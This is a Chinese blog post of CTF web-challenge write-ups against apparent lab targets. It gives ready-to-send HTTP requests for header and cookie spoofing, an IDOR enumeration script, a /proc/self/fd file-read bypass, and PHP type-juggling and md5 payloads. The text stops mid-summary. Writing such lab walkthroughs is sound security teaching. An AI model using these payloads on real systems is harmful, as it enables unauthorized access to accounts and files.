---
title: CTF-WEB
date: 2026-05-07 20:54:18
categories:
  - 学习
  - CTF
tags:
  - 简单知识
sticky: 1
---

# 前端逻辑信任 / 参数篡改题

---

## 题目类型

- 前端逻辑信任漏洞
- 参数篡改
- HTTP POST 请求
- Session / Cookie
- 302 重定向

---

## 题目现象

网页是一个拼图题，完成拼图点击提交后获取奖励。  
实际上，服务器信任前端传来的 `solved=1` 参数。

{% asset_img 1.png %}
---

## 核心漏洞

- 前端 JS 使用 `fetch('/complete.php', { body: 'csrf=xxxx&solved=1' })`  
- 服务器只判断 `solved` 是否为 1  
- 客户端参数可伪造，绕过拼图验证

---

## 解题思路

1. **抓包**  
   使用 Burp Suite 抓取 `POST /complete.php` 请求  

2. **分析并且伪造请求体**  
   ```text
   POST /complete.php HTTP/1.1
    Host: docker.qingcen.net:47762
    Cookie: PHPSESSID=xxxx

    csrf=xxxx&solved=1
   ```

3. **得到服务器响应**

如图一
```text
HTTP/1.1 302 Found
Location: /vault.php
```

4.**根据302重定向**

更改请求头
保留cookie，host等服务器识别身份的信息

GET /vault.php HTTP/1.1
Host: docker.qingcen.net:xxxxx
Cookie: PHPSESSID=xxxx

5.**答疑**
1.Q:为什么得到了重定向的地址之后不能直接在网址里面访问对应的页面
A:因为服务器判断是否可以进入不止需要地址，还需要Session Cookie 状态，这些因素；
session保留的是用户的一些信息，比如用户是否登录，是否完成拼图之类的
cookie则是保留了用户身份信息，使得服务器可以识别出你
2.Q:为什么使用get请求头可以绕过这些限制呢
A：其实并不是get绕过了验证，只是post已经通过了验证，get可以带着合法的session请求进行访问

# GET + POST 参数提交题

---

## 题目类型

- HTTP 请求方法
- GET 参数
- POST 参数
- 参数传递
- Burp Suite 改包
- curl 构造请求
- Web CTF 基础题

---

## 题目现象

访问题目页面后，页面提示需要传入指定参数。

根据题目提示，需要同时满足两个条件：

```text
GET 参数：a=QCCTF
POST 参数：b=yyds

如图是只加参数a进行请求，这样会得到服务器返回的让添加b参数的命令
{% asset_img 2.png %}

最后在请求最下面加上b=yyds可以得到flag

# HTTP 请求伪造 / Header 篡改题

---

## 题目类型

- GET / POST 参数
- Header 伪造
- Cookie 伪造
- IP 白名单绕过
- User-Agent 伪造
- Burp Suite 改包

---

## 题目现象

页面依次提示：

```text
GET 参数 a=a
POST 参数 b=b
IP 不在白名单
请使用 QingcenSafe 浏览器
请使用指定代理 xujinyingcangming.top
请使用 admin 账号登录
```

说明服务器在检查请求中的：

```text
URL 参数、POST Body、IP Header、User-Agent、Via、Cookie
```

---

## 核心思路

服务器信任了客户端传来的数据，而这些数据都可以用 Burp 伪造。

---

## 解题步骤

### 1. GET 参数

```http
POST /?a=a HTTP/1.1
```

---

### 2. POST 参数

```http
Content-Type: application/x-www-form-urlencoded

b=b
```

---

### 3. 伪造本地 IP

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Client-IP: 127.0.0.1
```

---

### 4. 伪造浏览器

```http
User-Agent: QingcenSafe
```

---

### 5. 伪造代理

```http
Via: xujinyingcangming.top
```

---

### 6. 伪造 admin 登录

```http
Cookie: user=admin
```

---

## 最终请求

```http
POST /?a=a HTTP/1.1
Host: docker.qingcen.net:48011
User-Agent: QingcenSafe
Content-Type: application/x-www-form-urlencoded
Cookie: user=admin
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Client-IP: 127.0.0.1
Via: xujinyingcangming.top

b=b
```

---


# Cookie 身份伪造 / 权限绕过题

---

## 题目类型

- Cookie 身份伪造
- 权限绕过
- HTTP 请求头修改
- Burp Suite 改包
- 客户端身份信息不可信
- 敏感信息泄露

---

## 题目现象

访问隐藏页面：

```text
/wqw.php
```

页面提示：

```text
您当前无权限查看本页。
请使用 admin 身份访问以查看：
项目管理、数据统计、配置中心、日志与监控。
```

同时服务器响应头中出现：

```http
Set-Cookie: user=user; path=/
```

说明服务器给当前用户设置了一个 Cookie：

```text
user=user
```

也就是普通用户身份。

---

## 核心漏洞

服务器把用户身份直接放在 Cookie 里：

```http
Cookie: user=user
```

如果后端只是简单判断：

```php
$_COOKIE["user"] == "admin"
```

那么客户端就可以直接伪造 Cookie：

```http
Cookie: user=admin
```

从而绕过权限检查，获得 admin 页面权限。

---

## 解题思路

1. **目录爆破 / 信息收集**

   使用 Burp Intruder 或目录扫描字典发现隐藏路径：

   ```text
   /wqw.php
   ```

2. **访问隐藏页面**

   原始请求：

   ```http
   GET /wqw.php HTTP/1.1
   Host: docker.qingcen.net:49078
   User-Agent: Mozilla/5.0
   Connection: close
   ```

3. **观察服务器响应**

   响应头中出现：

   ```http
   Set-Cookie: user=user; path=/
   ```

   页面提示：

   ```text
   当前无权限，请使用 admin 身份访问
   ```

   说明服务器可能通过 Cookie 判断身份。

4. **伪造 Cookie**

   将请求头中加入：

   ```http
   Cookie: user=admin
   ```

   修改后的请求：

   ```http
   GET /wqw.php HTTP/1.1
   Host: docker.qingcen.net:49078
   User-Agent: Mozilla/5.0
   Cookie: user=admin
   Connection: close

   ```

5. **得到授权页面**

   服务器返回：

   ```html
   <span class="badge unlocked">已授权</span>
   ```

   并在配置中心看到 flag：

   ```text
   flag{31d3d04c-9296-462b-a550-9d36533d6fd8}
   ```

---

## 关键请求头说明

### 1. Cookie

`Cookie` 是浏览器保存并发送给服务器的数据，常用于保存登录状态、用户身份、权限信息等。

服务器设置 Cookie：

```http
Set-Cookie: user=user; path=/
```

浏览器之后访问同一网站时会自动携带：

```http
Cookie: user=user
```

本题中将其改成：

```http
Cookie: user=admin
```

即可伪造管理员身份。

---

### 2. Connection

`Connection` 用来控制 HTTP 请求结束后，TCP 连接是否继续保持。

常见写法：

```http
Connection: keep-alive
```

表示请求结束后暂时不断开连接，方便后续继续复用。

```http
Connection: close
```

表示请求完成后关闭连接。

在 Burp Repeater 中手动发包时，推荐使用：

```http
Connection: close
```

这样请求更简单，不容易因为连接复用出现异常。

---

### 3. Content-Length

`Content-Length` 表示 HTTP 请求体 Body 的长度，单位是字节。

例如：

```http
POST /test.php HTTP/1.1
Host: example.com
Content-Length: 3

b=b
```

这里请求体是：

```text
b=b
```

长度是 3，所以：

```http
Content-Length: 3
```

如果是：

```http
Content-Length: 2
```

表示后面的 Body 长度是 2 个字节。

例如：

```http
POST /test.php HTTP/1.1
Host: example.com
Content-Length: 2

id
```

这里 Body 是：

```text
id
```

长度就是 2。

---

## 注意点

### 1. GET 请求一般不需要 Content-Length

本题最终请求是 GET 请求：

```http
GET /wqw.php HTTP/1.1
Host: docker.qingcen.net:49078
Cookie: user=admin
Connection: close

```

GET 请求一般没有 Body，所以不需要写：

```http
Content-Length
```

---

### 2. Header 最后要空一行

HTTP 请求头结束后必须空一行：

```http
GET /wqw.php HTTP/1.1
Host: docker.qingcen.net:49078
Cookie: user=admin
Connection: close

```

最后这个空行表示：

```text
请求头结束
```

否则 Burp 或服务器可能无法正确解析请求。

---

### 3. 优先根据 Set-Cookie 修改

服务器返回：

```http
Set-Cookie: user=user
```

所以优先改：

```http
Cookie: user=admin
```

不要一开始乱猜：

```http
Cookie: role=admin
Cookie: admin=1
Cookie: is_admin=1
```

因为本题真正使用的 Cookie 名就是：

```text
user
```

---

## 答疑

### Q1：为什么把 `user=user` 改成 `user=admin` 就能成功？

A：因为服务器把用户身份存在客户端 Cookie 中，并且信任客户端传回来的值。

原本：

```http
Cookie: user=user
```

表示普通用户。

修改后：

```http
Cookie: user=admin
```

服务器错误地认为当前访问者是 admin，因此返回授权页面。

---

### Q2：Cookie 是不是一定可信？

A：不可信。

Cookie 保存在客户端，用户可以通过 Burp、浏览器开发者工具等方式修改。

所以真实开发中不能直接相信：

```http
Cookie: user=admin
```

这种客户端可控字段。

---

### Q3：正确的权限设计应该怎么做？

A：真实项目中应该让 Cookie 只保存随机 session ID：

```http
Cookie: PHPSESSID=random_session_id
```

用户身份和权限应该保存在服务器端。

服务器根据 session ID 查询真实用户身份，而不是直接相信客户端传来的：

```http
Cookie: user=admin
```

---

### Q4：`Connection: close` 和 `Connection: keep-alive` 会影响权限绕过吗？

A：一般不会。

它们只是控制连接是否保持。

本题真正关键的是：

```http
Cookie: user=admin
```

---

### Q5：`Content-Length` 写错会怎样？

A：如果是 POST 请求，`Content-Length` 写错可能导致服务器读取 Body 出错。

例如 Body 是：

```text
b=b
```

长度应该是：

```http
Content-Length: 3
```

如果写成：

```http
Content-Length: 5
```

服务器可能多等两个字节，或者解析异常。

在 Burp 中建议：

```text
删除 Content-Length，让 Burp 自动计算。
```

---

## 本题最终请求

```http
GET /wqw.php HTTP/1.1
Host: docker.qingcen.net:49078
User-Agent: Mozilla/5.0
Cookie: user=admin
Connection: close

```

---

## 本题最终结果

页面显示：

```text
已授权
```

并泄露 flag：

```text
flag{31d3d04c-9296-462b-a550-9d36533d6fd8}
```

---

## 总结

本题本质是：

```text
服务器信任了客户端 Cookie 中的身份字段。
```

利用方式：

```text
把 Cookie: user=user 改成 Cookie: user=admin
```

漏洞类型：

```text
Cookie 身份伪造 / 权限绕过
```

核心记忆：

```text
Cookie 是客户端可控的，不能直接用来判断用户真实身份。
```

# IDOR / 越权访问题

---

## 题目类型

- IDOR（Insecure Direct Object Reference，不安全的直接对象引用）
- 越权访问
- ID 枚举
- 失效的访问控制（OWASP A01）

---

## 题目现象

访问文档中心，页面展示 6 份文档，点击卡片通过 `?id=` 参数查看内容。  
但展示的 ID 不连续：`1, 2, 3, 5, 7, 10`，明显跳过了 4、6、8、9 等编号。

{% asset_img 3.png %}

---

## 核心漏洞

- 服务器只靠"不告诉用户 ID 是多少"来保护文档
- 实际上对任意数字 ID 均无权限校验
- 只要猜到 ID，就能直接访问本不该看到的文档

---

## 解题思路

1. **观察 URL 参数**

   访问文档时 URL 为：
   ```text
   http://docker.qingcen.net:49099/?id=1
   ```
   参数 `id` 是纯数字，且首页展示的 ID 不连续，说明存在隐藏文档。

2. **枚举所有 ID（Burp Suite Intruder）**

   对 `id=1` 到 `id=300` 逐一发起请求，通过响应长度区分内容：

   | 响应长度 | 含义 |
   |---------|------|
   | ~3151 字节 | "该文档不存在或已归档" |
   | ~3400 字节 | 正常文档 |
   | **~3266 字节** | **异常 → 隐藏文档** |

   **Burp Suite Intruder 操作步骤：**

   1. 浏览器访问 `/?id=1`，在 Burp Proxy 中拦截该请求，右键 → **Send to Intruder**
   2. 在 Intruder 的 **Positions** 面板中，将 `id=§1§` 中的数字标记为 payload 位置
   3. 切换到 **Payloads** 面板：
      - Payload type 选 `Numbers`
      - From: `1`，To: `300`，Step: `1`
   4. 点击 **Start Attack** 开始爆破
   5. 攻击结束后，点击 **Length** 列排序，找到响应长度与众不同的条目

   结果如图，`id=121` 的响应长度明显异常：

   ```text
   id=1   → 3434
   id=2   → 3493
   ...
   id=121 → 3266  ← 异常，点击查看响应内容
   ```

   **Python 脚本（备用）：**
   ```python
   import urllib.request
   base = 'http://docker.qingcen.net:49099/?id='
   normal = {3151, 3834}  # 无内容页的响应长度
   for i in range(1, 300):
       r = urllib.request.urlopen(base + str(i), timeout=5)
       l = len(r.read())
       if l not in normal:
           print(f'id={i} len={l}')
   ```

3. **发现隐藏文档 id=121**

   Burp Intruder 攻击结果按长度排序后，`id=121` 长度异常，点击该条目查看 Response：
   ```text
   id=1 len=3434
   id=2 len=3493
   ...
   id=121 len=3266   ← 异常
   ```

4. **直接访问获取 flag**

   ```http
   GET /?id=121 HTTP/1.1
   Host: docker.qingcen.net:49099
   ```

   服务器返回：
   ```text
   flag{c0c16ffe-35b1-4b61-8105-4830cb33ce24}
   ```

---

## 答疑

### Q1：为什么首页不展示 id=121，但直接访问就能看到？

A：首页只是"不链接到"该文档，但服务器并没有做真正的权限校验。  
只要知道 ID，直接在 URL 中填入就可以访问，这就是 IDOR 漏洞的本质：  
**靠隐藏 ID 来保护资源，而不是靠真正的访问控制。**

---

### Q2：为什么用响应长度来判断是否有文档内容？

A：因为"不存在或已归档"的页面和"有内容"的页面结构不同，字节数自然有差异。  
通过长度筛选，可以快速排除无效 ID，找到真正有内容的文档。  
这比逐条读取页面 HTML 效率高得多。

---

### Q3：IDOR 和 SQL 注入有什么区别？

A：
- **SQL 注入**：通过构造恶意 SQL 语句，绕过查询逻辑获取数据。
- **IDOR**：不需要任何注入，直接用正常参数访问别人的资源，漏洞在于服务端没有验证"当前用户是否有权访问该 ID"。

本题不需要注入，只需要枚举数字 ID 即可。

---

## 本题最终请求

```http
GET /?id=121 HTTP/1.1
Host: docker.qingcen.net:49099
```

---

## 本题最终结果

```text
flag{c0c16ffe-35b1-4b61-8105-4830cb33ce24}
```

---

## 总结

本题本质是：

```text
服务器没有验证当前用户是否有权访问对应 ID 的文档。
```

利用方式：

```text
枚举 ?id= 参数，找到未在首页展示的隐藏文档 ID。
```

漏洞类型：

```text
IDOR / 越权访问 / 失效的访问控制
```

核心记忆：

```text
隐藏 ID 不等于权限控制，只有服务端验证身份才是真正的访问控制。
```

---

# 文件读取长度限制绕过 / /proc/self/fd 利用

---

## 题目类型

- 任意文件读取（LFI）
- 文件名长度限制绕过
- Linux /proc 伪文件系统利用

---

## 题目现象

页面直接展示 PHP 源码（`highlight_file(__FILE__)`）：

```php
<?php
highlight_file(__FILE__);
$flag = fopen('/admin_secret.txt', 'r');
if (isset($_GET['filename']) && strlen($_GET['filename']) < 17) {
  readfile($_GET['filename']);
} else {
  echo "The filename parameter does not exist or the filename is too long";
}
?>
```

目标文件 `/admin_secret.txt` 有 18 个字符，超过限制（< 17）无法直接传入。

---

## 核心漏洞

- `fopen('/admin_secret.txt', 'r')` 打开了目标文件但**从未 `fclose`**，文件描述符持续打开
- Linux 的 `/proc/self/fd/` 目录下每个子目录是当前进程已打开 fd 的符号链接
- `/proc/self/fd/5` 只有 **15 个字符**，满足 < 17 的限制，且指向已打开的 `/admin_secret.txt`

---

## 解题思路

1. **阅读源码，分析限制**

   在 Burp Suite → Proxy 中访问页面，Response 中可见 PHP 源码。确认：
   - 读取目标：`/admin_secret.txt`（18 字符，超限）
   - 限制：`strlen(filename) < 17`，即最多 16 字符
   - 接口：`readfile($_GET['filename'])` 可读任意文件

2. **构造绕过：利用 /proc/self/fd**

   PHP 在执行时 `fopen('/admin_secret.txt', 'r')` 会给该文件分配一个文件描述符（fd）。在 Linux 中，`/proc/self/fd/N` 是当前进程第 N 个 fd 的符号链接。

   在 Burp → Repeater 中，逐个尝试：

   ```http
   GET /?filename=/proc/self/fd/3 HTTP/1.1
   Host: docker.qingcen.net:49440
   ```

   fd/3、fd/4… 依次递增测试，直到响应中出现 flag 内容。

3. **fd/5 命中，响应包含 flag**

   ```http
   GET /?filename=/proc/self/fd/5 HTTP/1.1
   Host: docker.qingcen.net:49440
   ```

   Response 中出现 flag 内容。

---

## 答疑

### Q1：为什么能用 /proc/self/fd/5 而不是 /proc/self/fd/3？

A：fd/0、fd/1、fd/2 分别是 stdin/stdout/stderr，fd/3 通常是 nginx/PHP-FPM 内部使用的 socket 或日志，fd/5 是本次 PHP 脚本中 `fopen` 打开 `/admin_secret.txt` 实际分配到的描述符编号。具体编号因环境而异，需逐一枚举。

### Q2：为什么 fopen 之后文件描述符还能被读取？

A：`fopen` 返回的文件句柄在 PHP 中是一个资源对象，若没有显式 `fclose`，PHP 脚本执行期间该 fd 始终保持打开，`/proc/self/fd/N` 符号链接始终有效。

---

## 本题最终请求

```http
GET /?filename=/proc/self/fd/5 HTTP/1.1
Host: docker.qingcen.net:49440
```

---

## 总结

本题本质是：

```text
PHP 代码用 fopen 打开了敏感文件却未关闭，导致文件描述符泄露。
```

利用方式：

```text
通过 /proc/self/fd/N 符号链接（路径短于限制）访问已打开的文件描述符，间接读取目标文件内容。
```

漏洞类型：

```text
任意文件读取（LFI）+ 文件名长度限制绕过（/proc/self/fd 利用）
```

核心记忆：

```text
fopen 不 fclose = fd 泄露；/proc/self/fd/N 是绕过路径长度限制读取任意已打开文件的经典手法。
```

# PHP 弱类型比较绕过 / is_numeric 绕过

---

## 题目类型

- PHP 弱类型比较
- GET 参数绕过
- is_numeric 绕过

---

## 题目源码

```php
<?php
show_source(__FILE__);
include("flag.php");

$a=@$_GET['a'];
$b=@$_GET['b'];

if($a and $a==0){
    if(is_numeric($b)){
        exit("nono");
    }else{
        if($b>2026){
            echo $flag;
        }
    }
}else{
    exit("no");
}
?>
```

---

## 核心漏洞

- PHP `==` 为弱类型比较，会自动进行类型转换
- `is_numeric()` 只判断是否为“纯数字字符串”
- PHP 在字符串和数字比较时，会自动提取字符串前面的数字部分

---

## 解题思路

### 1. 分析第一层条件

源码：

```php
if($a and $a==0)
```

要求：

```text
$a 为 true
并且
$a == 0
```

构造：

```text
a=0e123
```

绕过原理：

```text
"0e123" 是非空字符串，所以布尔值为 true
```

同时：

```text
PHP 使用 == 时会自动类型转换
```

`"0e123"` 会被 PHP 当成科学计数法：

```text
0 × 10^123
```

结果等于：

```text
0
```

所以：

```php
"0e123" == 0
```

结果为：

```text
true
```

因此成功绕过：

```php
if($a and $a==0)
```

---

### 2. 分析第二层条件

源码：

```php
if(is_numeric($b)){
    exit("nono");
}
```

要求：

```text
$b 不能是纯数字
```

构造：

```text
b=2027a
```

绕过原理：

```php
is_numeric("2027a")
```

结果：

```text
false
```

因为：

```text
"2027a" 含有字母，不是纯数字字符串
```

所以不会进入：

```php
exit("nono");
```

---

### 3. 分析第三层条件

源码：

```php
if($b>2026)
```

要求：

```text
$b > 2026
```

虽然：

```text
"2027a"
```

不是纯数字，但 PHP 在字符串和数字比较时，会自动提取前面的数字部分：

```text
"2027a" → 2027
```

所以：

```php
"2027a" > 2026
```

等价于：

```php
2027 > 2026
```

结果为：

```text
true
```

最终进入：

```php
echo $flag;
```

---

## Burp Suite 操作

抓包后发送到 Repeater：

```http
GET /?a=0e123&b=2027a HTTP/1.1
Host: docker.qingcen.net:xxxxx
```

点击：

```text
Send
```

即可得到 flag。

---

## 本题最终请求

```http
GET /?a=0e123&b=2027a HTTP/1.1
Host: docker.qingcen.net:xxxxx
```

---

## 总结

本题本质：

```text
利用 PHP 弱类型比较和自动类型转换进行绕过
```

利用方式：

```text
a=0e123
```

绕过：

```php
$a and $a==0
```

因为：

```text
"0e123" 非空，所以为 true
"0e123" == 0 为 true
```

再利用：

```text
b=2027a
```

绕过：

```php
is_numeric($b)
```

同时满足：

```php
$b > 2026
```

核心记忆：

```text
PHP 的 == 会自动类型转换；
0e123 会被当成数字 0；
字符串和数字比较时会自动提取前导数字。
```
# PHP json_decode + array_search + foreach 严格比较绕过

---

## 题目类型

- JSON 参数解析
- array_search 弱类型
- foreach 严格比较
- PHP 类型绕过

---

## 题目源码

```php
<?php
show_source(__FILE__);
include("flag.php");

if (!isset($_GET['qc']) || $_GET['qc'] === '') exit("no");

$qc = (array)json_decode($_GET['qc'], true);

if (!isset($qc["n"]) || !is_array($qc["n"]) || empty($qc["n"])) die("no");

if (array_search("QCCTF", $qc) === false) die("no...");

if (array_search("QCyyds", $qc["n"]) === false) die("no...");

foreach ($qc["n"] as $val) {
    if ($val === "QCyyds") die("no......");
}

echo $flag;
```

---

## 核心漏洞

- `array_search()` 默认使用弱类型比较 `==`
- `foreach` 中使用严格比较 `===`
- `0 == "QCyyds"` 为 true
- `0 === "QCyyds"` 为 false

---

## 解题思路

### 1. 分析第一层判断

源码：

```php
if (!isset($qc["n"]) || !is_array($qc["n"]) || empty($qc["n"]))
```

要求：

```text
qc["n"] 必须存在
qc["n"] 必须是数组
qc["n"] 不能为空
```

因此需要构造：

```json
{
  "n":[...]
}
```

---

### 2. 分析 array_search("QCCTF",$qc)

源码：

```php
if (array_search("QCCTF", $qc) === false)
```

要求：

```text
qc 数组中必须存在 "QCCTF"
```

构造：

```json
{
  "0":"QCCTF",
  "n":[...]
}
```

这样：

```php
array_search("QCCTF",$qc)
```

返回：

```text
0
```

不是 false，因此通过。

---

### 3. 分析 array_search("QCyyds",$qc["n"])

源码：

```php
if (array_search("QCyyds", $qc["n"]) === false)
```

要求：

```text
qc["n"] 中必须能找到 "QCyyds"
```

这里：

```php
array_search()
```

默认使用：

```text
弱类型比较 ==
```

构造：

```json
"n":[0]
```

因为：

```php
0 == "QCyyds"
```

结果为：

```text
true
```

原因：

```text
PHP 比较数字和字符串时，
字符串会转换成数字。

"QCyyds" → 0
```

因此：

```php
array_search("QCyyds",[0])
```

可以找到元素。

---

### 4. 分析 foreach 严格比较

源码：

```php
foreach ($qc["n"] as $val) {
    if ($val === "QCyyds") die("no......");
}
```

这里使用：

```php
===
```

严格比较要求：

```text
值相同
类型也相同
```

因此：

```php
0 === "QCyyds"
```

结果：

```text
false
```

因为：

```text
0 是整数
"QCyyds" 是字符串
```

所以不会进入：

```php
die("no......");
```

最终执行：

```php
echo $flag;
```

---

## 最终 payload

构造：

```json
{
  "0":"QCCTF",
  "n":[0]
}
```

URL 形式：

```text
/?qc={"0":"QCCTF","n":[0]}
```

URL 编码后：

```text
/?qc=%7B%220%22:%22QCCTF%22,%22n%22:[0]%7D
```

---

## Burp Suite 操作

抓包后发送到 Repeater：

```http
GET /?qc={"0":"QCCTF","n":[0]} HTTP/1.1
Host: docker.qingcen.net:xxxxx
```

点击：

```text
Send
```

即可得到 flag。

---

## 本题最终请求

```http
GET /?qc={"0":"QCCTF","n":[0]} HTTP/1.1
Host: docker.qingcen.net:xxxxx
```

---

## 总结

本题本质：

```text
利用 array_search 的弱类型比较
绕过 foreach 中的严格比较
```

关键点：

```text
array_search 使用 ==
foreach 使用 ===
```

核心 payload：

```json
{
  "0":"QCCTF",
  "n":[0]
}
```

核心记忆：

```text
0 == "QCyyds" 为 true
0 === "QCyyds" 为 false
```

# PHP md5 弱类型碰撞 / 0e 绕过

---

## 题目类型

- PHP 弱类型比较
- md5 绕过
- 0e 科学计数法
- 哈希碰撞

---

## 题目源码

```php
<?php

include "flag.php";

highlight_file(__FILE__);

$admin_hash = '0e830400451993494058024219903391';

if (isset($_GET['QC'])) {
    $qc = (string)$_GET['QC'];
    $hp = md5($qc);

    if ($hp == $admin_hash) {
        echo "<br>Welcome, admin!<br>";
        echo $flag;
    } else {
        echo "<br>Login failed.";
    }
}
?>
```

---

## 核心漏洞

- PHP `==` 为弱类型比较，会自动类型转换
- 形如：

```text
0e123456
```

的字符串会被 PHP 当成：

```text
科学计数法数字
```

即：

```text
0 × 10^123456
```

结果等于：

```text
0
```

因此：

```php
"0e123" == "0e456"
```

结果为：

```text
true
```

---

## 解题思路

### 1. 分析 md5 比较

源码：

```php
if ($hp == $admin_hash)
```

这里使用：

```php
==
```

不是：

```php
===
```

因此会发生：

```text
弱类型比较
```

---

### 2. 分析 admin_hash

源码：

```php
$admin_hash = '0e830400451993494058024219903391';
```

特点：

```text
以 0e 开头
后面全部是数字
```

PHP 会把它当成：

```text
科学计数法
```

即：

```text
0 × 10^830400451993494058024219903391
```

结果等于：

```text
0
```

---

### 3. 构造 md5 结果同样为 0e 开头

只要让：

```php
md5($qc)
```

结果也是：

```text
0e + 全数字
```

PHP 比较时：

```php
$hp == $admin_hash
```

就会变成：

```text
0 == 0
```

从而绕过。

---

### 4. 常见 payload

经典 payload：

```text
QNKCDZO
```

因为：

```php
md5("QNKCDZO")
```

结果：

```text
0e830400451993494058024219903391
```

属于：

```text
0e + 全数字
```

因此：

```php
md5("QNKCDZO") == "0e830400451993494058024219903391"
```

结果为：

```text
true
```

---

## 最终 payload

构造：

```text
QC=QNKCDZO
```

完整 URL：

```text
/?QC=QNKCDZO
```

---

## Burp Suite 操作

抓包后发送到 Repeater：

```http
GET /?QC=QNKCDZO HTTP/1.1
Host: docker.qingcen.net:xxxxx
```

点击：

```text
Send
```

即可得到 flag。

---

## 为什么能绕过？

因为：

```php
==
```

会自动类型转换。

比较时：

```php
"0e830400451993494058024219903391"
==
"0e830400451993494058024219903391"
```

会被 PHP 当成：

```text
0 == 0
```

结果为：

```text
true
```

---

## 本题最终请求

```http
GET /?QC=QNKCDZO HTTP/1.1
Host: docker.qingcen.net:xxxxx
```

---

## 总结

本题本质：

```text
利用 PHP md5 弱类型比较进行绕过
```

关键点：

```text
PHP 的 == 会自动类型转换
0e 开头的字符串会被当成科学计数法数字 0
```

核心 payload：

```text
QNKCDZO
```

核心记忆：

```text
md5("QNKCDZO")
=
0e830400451993494058024219903391
```

因此：

```php
md5("QNKCDZO") == "0e830400451993494058024219903391"
```

结果为：

```text
true
```

# PHP md5 弱比较绕过 / 0e 禁止绕过

---

## 题目类型

- PHP md5 弱类型比较
- 0e 绕过限制
- md5 碰撞
- PHP 类型转换

---

## 题目源码

```php
<?php

include "flag.php";

highlight_file(__FILE__);

if (isset($_GET['a']) && isset($_GET['b'])) {
    $a = $_GET['a'];
    $b = $_GET['b'];
    
    $md5_a = md5($a);
    $md5_b = md5($b);
    
    if (substr($md5_a, 0, 2) === '0e' || substr($md5_b, 0, 2) === '0e') {
        echo "<br>0e not allowed!";
    } elseif ($a != $b && $md5_a == $md5_b) {
        echo "<br>Welcome, admin!<br>";
        echo $flag;
    } else {
        echo "<br>Login failed.";
    }
}
?>
```

---

## 核心漏洞

- PHP `==` 为弱类型比较
- 题目禁止了：

```text
0e 开头 md5
```

因此经典：

```text
QNKCDZO
240610708
```

无法使用。

但：

```text
md5() 遇到数组时会返回 NULL
```

而：

```php
NULL == NULL
```

结果为：

```text
true
```

因此可以利用：

```text
数组绕过
```

---

## 解题思路

### 1. 分析第一层过滤

源码：

```php
if (substr($md5_a, 0, 2) === '0e' || substr($md5_b, 0, 2) === '0e')
```

作用：

```text
禁止 md5 结果以 0e 开头
```

因此：

```text
0e magic hash 无法使用
```

---

### 2. 分析 md5()

源码：

```php
$md5_a = md5($a);
$md5_b = md5($b);
```

正常情况下：

```php
md5("abc")
```

返回：

```text
900150983cd24fb0d6963f7d28e17f72
```

但是：

```php
md5(array())
```

会报 Warning，并返回：

```php
NULL
```

例如：

```php
md5([])
```

结果：

```text
NULL
```

---

### 3. 绕过 substr()

源码：

```php
substr($md5_a, 0, 2)
```

如果：

```php
$md5_a = NULL
```

那么：

```php
substr(NULL,0,2)
```

结果不是：

```text
0e
```

因此不会进入：

```php
0e not allowed!
```

---

### 4. 绕过 md5 比较

源码：

```php
$md5_a == $md5_b
```

如果：

```php
$md5_a = NULL
$md5_b = NULL
```

那么：

```php
NULL == NULL
```

结果：

```text
true
```

---

### 5. 满足 a != b

源码：

```php
$a != $b
```

因此需要：

```text
a 和 b 不同
```

构造：

```text
a[]=1
b[]=2
```

这样：

```php
$a = array(1)
$b = array(2)
```

因此：

```php
$a != $b
```

成立。

同时：

```php
md5($a)
md5($b)
```

都会返回：

```text
NULL
```

于是：

```php
$md5_a == $md5_b
```

即：

```php
NULL == NULL
```

结果：

```text
true
```

最终得到 flag。

---

## 最终 payload

```text
/?a[]=1&b[]=2
```

---

## Burp Suite 操作

抓包后发送到 Repeater：

```http
GET /?a[]=1&b[]=2 HTTP/1.1
Host: docker.qingcen.net:xxxxx
```

点击：

```text
Send
```

即可得到 flag。

---

## 为什么这个方法能绕过？

因为：

```php
md5(array())
```

会返回：

```php
NULL
```

因此：

```php
$md5_a == $md5_b
```

变成：

```php
NULL == NULL
```

结果：

```text
true
```

同时：

```php
$a != $b
```

也成立。

因此成功绕过。

---

## 本题最终请求

```http
GET /?a[]=1&b[]=2 HTTP/1.1
Host: docker.qingcen.net:xxxxx
```

---

## 总结

本题本质：

```text
利用 md5(array()) 返回 NULL
进行弱类型比较绕过
```

关键点：

```text
md5(array()) → NULL
NULL == NULL → true
```

核心 payload：

```text
a[]=1
b[]=2
```

核心记忆：

```text
PHP md5() 处理数组时返回 NULL
弱比较下 NULL == NULL 为 true
```

# PHP md5 强比较碰撞题

---

## 题目类型

- md5 碰撞
- PHP 强类型比较
- 二进制碰撞
- 真正的 md5 collision

---

## 题目源码

```php
<?php

include "flag.php";

highlight_file(__FILE__);

if (isset($_GET['a']) && isset($_GET['b'])) {
    $a = $_GET['a'];
    $b = $_GET['b'];
    
    if ($a != $b && md5($a) === md5($b)) {
        echo "<br>Welcome, admin!<br>";
        echo $flag;
    } else {
        echo "<br>Login failed.";
    }
}
?>
```

---

## 核心漏洞

这里使用的是：

```php
md5($a) === md5($b)
```

注意：

```php
===
```

是：

```text
严格比较
```

因此：

```text
0e 弱类型绕过已经失效
```

必须满足：

```text
md5($a)
和
md5($b)

真正完全相同
```

也就是：

```text
真正的 md5 collision（md5 碰撞）
```

---

## 解题思路

### 1. 分析条件

源码：

```php
if ($a != $b && md5($a) === md5($b))
```

要求：

```text
a 和 b 不同
```

同时：

```text
md5(a) 和 md5(b) 完全相同
```

---

## 2. 为什么 0e 绕过失效？

以前：

```php
md5($a) == md5($b)
```

可以利用：

```text
0e 开头 magic hash
```

因为：

```php
==
```

会自动类型转换。

但现在：

```php
===
```

要求：

```text
值相同
类型也相同
```

所以：

```php
"0e123" === "0e456"
```

结果：

```text
false
```

因此：

```text
0e 绕过失效
```

---

## 3. 核心突破：传数组绕过 md5()

PHP 的 `md5()` 函数传入**数组**时不会计算哈希，而是直接返回 `null`，并抛出一个 Warning（不影响执行）。

```php
md5([1])  // 返回 null
md5([2])  // 返回 null
null === null  // true ✓
[1] != [2]    // true ✓
```

两个条件全部满足，直接拿到 flag。

---

## 4. Payload

在浏览器地址栏直接访问：

```text
http://docker.qingcen.net:32858/?a[]=1&b[]=2
```

`a[]=1` 表示传入数组 `[1]`，`b[]=2` 表示传入数组 `[2]`。

服务器执行：

```php
$a = [1];  // 数组
$b = [2];  // 数组
[1] != [2]         // true
md5([1]) === md5([2])  // null === null → true
// 输出 flag
```

---

## 本题最终请求

```http
GET /?a[]=1&b[]=2 HTTP/1.1
Host: docker.qingcen.net:32858
```

---

## 总结

本题核心：

```text
=== 无法使用 0e 绕过
